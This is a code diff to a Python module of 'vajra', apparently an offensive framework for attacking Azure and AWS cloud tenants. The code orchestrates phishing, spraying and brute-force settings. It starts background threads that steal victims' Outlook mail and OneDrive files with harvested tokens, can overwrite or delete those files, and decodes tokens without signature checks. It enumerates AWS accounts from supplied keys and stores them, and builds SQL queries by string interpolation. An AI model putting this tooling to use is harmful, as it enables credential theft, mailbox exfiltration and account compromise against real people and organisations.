@@ -18,16 +18,24 @@
 # The creator takes no responsibility of any mis-use of this tool.
 
 from sqlalchemy.sql.expression import false, true
-from vajra import db, bcrypt, engine
+from flask_login import current_user
+from vajra import db, bcrypt, sqlite_used, DB_PATH, POSTGRES
 from vajra.models import *
-import sys, os, base64, threading, base64, json, jwt
 from sqlalchemy.sql import text
 from vajra.azure.attacks.phishing import stealerAction, stealing
 from vajra.azure.enumeration.azureAd import azureAdEnum
 from vajra.azure.enumeration.azureAzService import  azureAzServiceEnum
+from vajra.aws.enumeration.enumerate import startEnumerate
+from vajra.aws.enumeration.function import get_client
+from vajra.aws.enumeration.s3Scanner import s3ScannerEnum
 import pandas as pd
-from flask_login import current_user
+import sqlite3 as sqlite
+import psycopg2 as pg
+import sys, os, threading, base64, json, jwt
+from vajra.aws.enumeration.config_review  import startconfigReview
+import requests
 
+directory = os.path.dirname(os.path.realpath(__file__)) + "/tmp/"
 
 class thread_with_trace(threading.Thread):
   def __init__(self, *args, **keywords):
@@ -68,7 +76,7 @@ def firstVisitDb(uuid):
         azureStorageAccountConfig(uuid=uuid),
         specificAttackStatus(uuid=uuid),
         AttackStatus(uuid=uuid, phishing="False", spraying="False", bruteforce="False"),
-        enumerationStatus(uuid=uuid, userenum="False", subdomain="False", azureAdEnum="False"),
+        enumerationStatus(uuid=uuid, userenum="False", subdomain="False", azureAdEnum="False")
         ]
     )
     db.session.commit()
@@ -136,13 +144,19 @@ class stolenData():
     def getAllvictims():
         return Allusers.query.filter_by(uuid= current_user.id).limit(2).all()
 
+    def getTotalvictims():
+        return Allusers.query.filter_by(uuid= current_user.id).count()
+
     def getVisitors():
         return Visitors.query.with_entities(Visitors.ip, Visitors.uuid).filter_by(uuid=current_user.id).distinct().count()
+
+    def getAzAPIcount():
+        return Admin.query.filter_by(id=current_user.id).first().azureUsage
 
 def enumeratedData(victim):
     class get():
         azureAdGroupData = azureAdEnumeratedGroups.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
-        azureAdUsersData = azureAdEnumeratedUsers.query.filter_by(uuid=current_user.id, victim=victim).order_by(azureAdEnumeratedUsers.roles.desc()).limit(1000).all()
+        azureAdUsersData = azureAdEnumeratedUsers.query.filter_by(uuid=current_user.id, victim=victim).order_by(azureAdEnumeratedUsers.roles.desc(), azureAdEnumeratedUsers.usersGroups.desc()).limit(1000).all()
         azureAdDeviceData = azureAdEnumeratedDevices.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
         azureAdAdminusers = azureAdEnumeratedAdmins.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
         azureAdCustomDirectoryRoles = azureAdEnumeratedCustomDirectoryRoles.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
@@ -259,6 +273,7 @@ def insertBruteforceConfig(form):
     passList = form.passwordList.data
     bruteforceConfig.query.filter_by(uuid = current_user.id).delete()
     db.session.commit()
+    db.session.rollback()
     if form.usernameListFile.data:
         userList = userList + "\r\n" +form.usernameListFile.data.read().decode("utf-8")
 
@@ -341,7 +356,7 @@ def startStealing(uuid, username):
             threading.Thread(target=stealing.listusers, args=(uuid, accessToken, username)).start()
 
         if config.outlook == "checked" or config.stealAll == "checked":            
-            threading.Thread(target=stealing.outlook, args=(uuid, accessToken, username, "/me/mailfolders/inbox/messages?$top=999")).start()
+            threading.Thread(target=stealing.outlook, args=(uuid, accessToken, username, "/me/mailfolders/inbox/messages?$top=300")).start()
 
         if config.oneDrive == "checked" or config.stealAll == "checked":
             threading.Thread(target=stealing.oneDrive, args=(uuid, accessToken, username, getDefaultPhishingConfig(uuid))).start()
@@ -365,14 +380,13 @@ def getNewToken(username):
     accessToken = stealerAction.getAccessToken(current_user.id, username)
     return accessToken
     
-def replaceOneDriveFile(username, id, name, content):
-    return stealerAction.replaceOneDriveFile(username, id, name, content)
+def replaceOneDriveFile(uuid, username, id, name, content):
+    return stealerAction.replaceOneDriveFile(uuid, username, id, name, content)
 
-def deleteOneDriveFile(username, id):
-    return stealerAction.deleteOneDriveFile(username, id)
+def deleteOneDriveFile(uuid, username, id):
+    return stealerAction.deleteOneDriveFile(uuid, username, id)
 
 def downloadfile(file, b64):
-    directory = os.path.dirname(os.path.realpath(__file__)) + "/tmp/"
     try:
         os.stat(directory)
     except:
@@ -403,12 +417,16 @@ def startAzureAdEnumeration(form):
 
     elif accessToken != "":
         try:
-            username = jwt.decode(accessToken, options={"verify_signature": False})["upn"]
+            try:
+                username = jwt.decode(accessToken, options={"verify_signature": False})["upn"]
+            except:
+                username = jwt.decode(accessToken, options={"verify_signature": False})["oid"]
         except:
             return "error", "Invaild Token Found!"
+
         res = azureAdEnum.enumToken(current_user.id, accessToken, username)
         return res
-        
+
     return "warning", "Invalid Credentials or Access Token not found!"
 
 def startAzServiceEnumeration(form):
@@ -423,9 +441,16 @@ def startAzServiceEnumeration(form):
 
     elif accessToken != "":
         try:
-            username = jwt.decode(accessToken, options={"verify_signature": False})["upn"]
+            try:
+                username = jwt.decode(accessToken, options={"verify_signature": False})["upn"]
+            except:
+                try:
+                    username = jwt.decode(accessToken, options={"verify_signature": False})["xms_mirid"].split("/")[-1]
+                except:
+                    username = jwt.decode(accessToken, options={"verify_signature": False})["appid"]    
         except:
-            return "error", "Invaild Token Found!"    
+            
+            return "error", "Invaild Token Found!"           
         
         res = azureAzServiceEnum.enumToken(current_user.id, accessToken, username)
         return res
@@ -447,8 +472,11 @@ def getPath(type, id):
         return downloadfile(oneNote, false)
 
 def downloadBruteforce(type):
-    directory = os.path.dirname(os.path.realpath(__file__)) + "/tmp/"
-    
+    if sqlite_used == True:
+        engine = sqlite.connect(DB_PATH)
+    else:
+        engine = pg.connect(POSTGRES)
+
     if type == "config":
         path = directory + "bruteforce_configuration.xlsx"
         sh = pd.read_sql_query(f"select * from bruteforce_config where uuid = '{current_user.id}'", con=engine)
@@ -466,8 +494,11 @@ def downloadBruteforce(type):
         return path        
 
 def downloadSpraying(type):
-    directory = os.path.dirname(os.path.realpath(__file__)) + "/tmp/"
-    
+    if sqlite_used == True:
+        engine = sqlite.connect(DB_PATH)
+    else:
+        engine = pg.connect(POSTGRES)
+
     if type == "addedemails":
         path = directory + "spraying_configuration.xlsx"
         sh = pd.read_sql_query(f"select * from added_victims where uuid = '{current_user.id}'", con=engine)
@@ -475,7 +506,7 @@ def downloadSpraying(type):
             sh.to_excel(writer, sheet_name='Added Victims', index=False)
 
         return path
-
+    
     if type == "results":
         path = directory + "spraying_results.xlsx"
         sh = pd.read_sql_query(f"select * from spraying_result where uuid = '{current_user.id}'", con=engine)
@@ -485,8 +516,10 @@ def downloadSpraying(type):
         return path    
     
 def downloadUserenum():
-    directory = os.path.dirname(os.path.realpath(__file__)) + "/tmp/"
-    
+    if sqlite_used == True:
+        engine = sqlite.connect(DB_PATH)
+    else:
+        engine = pg.connect(POSTGRES)
     path = directory + "valid_emails.xlsx"
 
     sh = pd.read_sql_query(f"select * from valid_emails where uuid = '{current_user.id}'", con=engine)
@@ -496,18 +529,24 @@ def downloadUserenum():
     return path
 
 def downloadSubdomainEnum():
-    directory = os.path.dirname(os.path.realpath(__file__)) + "/tmp/"
+    if sqlite_used == True:
+        engine = sqlite.connect(DB_PATH)
+    else:
+        engine = pg.connect(POSTGRES)
     path = directory + "valid_subdomains.xlsx"
     
-    sh = pd.read_sql_query(f"select validSubdomain from enumeration_results where uuid = '{current_user.id}'", con=engine)
+    sh = pd.read_sql_query(f"SELECT * FROM enumeration_results where uuid = '{current_user.id}'", con=engine)
     with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
         sh.to_excel(writer, sheet_name='Valid Subdomains', index=False)
     
     return path
-
+ 
 def victimsDownload(type):
-    directory = os.path.dirname(os.path.realpath(__file__)) + "/tmp/"
-    
+    if sqlite_used == True:
+        engine = sqlite.connect(DB_PATH)
+    else:
+        engine = pg.connect(POSTGRES)
+
     if type == "more":
         path = directory + "more_victims.xlsx"
         sh = pd.read_sql_query(f"select * from allusers where uuid = '{current_user.id}'", con=engine)
@@ -524,7 +563,11 @@ def victimsDownload(type):
         return path
 
 def downloadEnumeratedData(victim):
-    directory = os.path.dirname(os.path.realpath(__file__)) + "/tmp/"
+    if sqlite_used == True:
+        engine = sqlite.connect(DB_PATH)
+    else:
+        engine = pg.connect(POSTGRES)
+
     path = directory + "Azure_AD_Enumerated_data.xlsx"
     
     sh1 = pd.read_sql_query(f"select * from azure_ad_enumerated_user_profile where uuid = '{current_user.id}' and victim = {victim}", con=engine)
@@ -599,7 +642,11 @@ def insert_storage_accounts_config(form):
 
 def downloadspecificStorageResults():
 
-    directory = os.path.dirname(os.path.realpath(__file__)) + "/tmp/"
+    if sqlite_used == True:
+        engine = sqlite.connect(DB_PATH)
+    else:
+        engine = pg.connect(POSTGRES)
+
     path = directory + "Public_Storage_Account_Files.xlsx"
     
     sh1 = pd.read_sql_query(f"select valid from specific_attack_storage_results where uuid = '{current_user.id}' ", con=engine)
@@ -608,3 +655,157 @@ def downloadspecificStorageResults():
         sh1.to_excel(writer, sheet_name='Profile', index=False)
 
     return path
+
+
+
+##########################################------------AWS-------------------####################################################
+
+
+def startAWSEnumeration(uuid, form):
+    key = form.key.data
+    secret = form.secret.data
+    session = form.session.data
+    jsonBody = form.json.data
+
+    try:
+        if jsonBody != "":
+            metadata = json.loads(jsonBody)["Credentials"]
+            key = metadata["AccessKeyId"]
+            secret = metadata["SecretAccessKey"]
+            session = metadata["SessionToken"]
+    except:
+        return "error", "Invalid Json"
+    client = get_client(key, secret, session, 'sts', None)
+    # Delete previous data
+    try:
+        Victim_user = client.get_caller_identity()
+        victim = Victim_user["Arn"]
+        userId = Victim_user["UserId"]
+        awsIAMVictims.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsIAMUsers.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsIAMGroups.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsEc2.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsIAMRolePolicies.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsCognitoUserPool.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsS3.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsIAMPolicies.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsLambda.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsEC2SS.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsSecurityGroups.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsVPCs.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsRoute53.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsECR.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsEKS.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsECS.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsCloudFront.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsStorageGateway.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsEFS.query.filter_by(uuid=uuid, victim=victim).delete()
+    except Exception as e:
+        print(e)
+        return "error", "Invalid Credentials"
+    
+    iamVictim = awsIAMVictims(uuid=uuid, victim=victim, userId=userId, key=key, secret=secret, session=session, enumStatus="progress")
+    db.session.add(iamVictim)
+    db.session.commit()
+        
+    threading.Thread(target=startEnumerate, args=(uuid, key, secret, session)).start()
+
+    return "success", "Enumeration started in background!"
+
+
+def startAWSConfigReview(uuid, form):
+
+    access_key = form.key.data
+    secret_key = form.secret.data
+    session_token = form.session.data
+    
+    client = get_client(access_key, secret_key, session_token, 'sts', None)
+    # Delete previous data
+    try:
+        Victim_user = client.get_caller_identity()
+        victim = Victim_user["Arn"]
+        userId = Victim_user["UserId"]
+        aws_config.query.filter_by(uuid=uuid, victim=victim).delete()
+        awsConfigVictims.query.filter_by(uuid=uuid, victim=victim).delete()
+        db.session.commit()
+    except Exception as e:
+        return "error", "Invalid Credentials"
+    
+    ConfigVictim = awsConfigVictims(uuid=uuid, victim=victim, userId=userId, key=access_key, secret=secret_key, session=session_token, configStatus="progress")
+    db.session.add(ConfigVictim)
+
+    db.session.commit()
+    threading.Thread(target=startconfigReview, args=(uuid, victim, access_key, secret_key, session_token)).start()
+
+    return "success", "Misconguration Review Started!"
+
+def downloadAWSconfigAssessmentResults(uuid, victim):
+    if sqlite_used == True:
+        engine = sqlite.connect(DB_PATH)
+    else:
+        engine = pg.connect(POSTGRES)
+
+    path = os.path.join(directory , "AWS_Config_Assessment.xlsx")
+    sh = pd.read_sql_query(f"select checkNo, checkTitle, status, result, arn from aws_config where uuid = '{uuid}' and victim = '{victim}' order by 1", con=engine)
+    with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
+            sh.to_excel(writer, sheet_name='Phished Users', index=False)
+
+    return path
+
+
+def deleteAwsEnumeratediamVictim(uuid, victimId):
+    victim = awsIAMVictims.query.filter_by(uuid=uuid, userId=victimId).first().victim
+    awsIAMVictims.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsIAMUsers.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsIAMGroups.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsEc2.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsIAMRolePolicies.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsCognitoUserPool.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsS3.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsIAMPolicies.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsLambda.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsEC2SS.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsSecurityGroups.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsVPCs.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsRoute53.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsECR.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsEKS.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsECS.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsCloudFront.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsStorageGateway.query.filter_by(uuid=uuid, victim=victim).delete()
+    awsEFS.query.filter_by(uuid=uuid, victim=victim).delete()
+    db.session.commit()
+
+
+def awsiamenumeratedDeleteAll(uuid):
+    awsIAMVictims.query.filter_by(uuid=uuid).delete()
+    awsIAMUsers.query.filter_by(uuid=uuid).delete()
+    awsIAMGroups.query.filter_by(uuid=uuid).delete()
+    awsEc2.query.filter_by(uuid=uuid).delete()
+    awsIAMRolePolicies.query.filter_by(uuid=uuid).delete()
+    awsCognitoUserPool.query.filter_by(uuid=uuid).delete()
+    awsS3.query.filter_by(uuid=uuid).delete()
+    awsIAMPolicies.query.filter_by(uuid=uuid).delete()
+    awsLambda.query.filter_by(uuid=uuid).delete()
+    awsEC2SS.query.filter_by(uuid=uuid).delete()
+    awsSecurityGroups.query.filter_by(uuid=uuid).delete()
+    awsVPCs.query.filter_by(uuid=uuid).delete()
+    awsRoute53.query.filter_by(uuid=uuid).delete()
+    awsECR.query.filter_by(uuid=uuid).delete()
+    awsEKS.query.filter_by(uuid=uuid).delete()
+    awsECS.query.filter_by(uuid=uuid).delete()
+    awsCloudFront.query.filter_by(uuid=uuid).delete()
+    awsStorageGateway.query.filter_by(uuid=uuid).delete()
+    awsEFS.query.filter_by(uuid=uuid).delete()
+    db.session.commit()
+
+
+
+def runS3Scanner(form, file):
+
+    awsS3Scanner.query.filter_by(uuid=current_user.id, name=form.commonWord.data).delete()
+    db.session.commit()
+    db.session.add(awsS3Scanner(uuid=current_user.id, name=form.commonWord.data, permutations=file.decode("utf-8"), progress="progress"))
+    db.session.commit()
+    
+    s3ScannerEnum.start(current_user.id, form.commonWord.data)
